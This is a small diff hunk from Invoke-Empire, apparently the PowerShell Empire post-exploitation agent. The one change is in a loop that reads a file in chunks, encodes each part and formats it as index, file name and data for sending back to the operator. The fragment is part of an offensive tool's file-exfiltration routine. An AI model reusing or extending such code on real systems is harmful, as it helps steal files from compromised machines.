@@ -851,7 +851,7 @@ function Invoke-Empire {
                         # read in and send the specified chunk size back for as long as the file has more parts
                         $Index = 0
                         do{
-                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
+                            $EncodedPart = Get-FilePart "$file" -Index $Index -ChunkSize $ChunkSize
 
                             if($EncodedPart) {
                                 $data = "{0}|{1}|{2}" -f $Index, $file, $EncodedPart
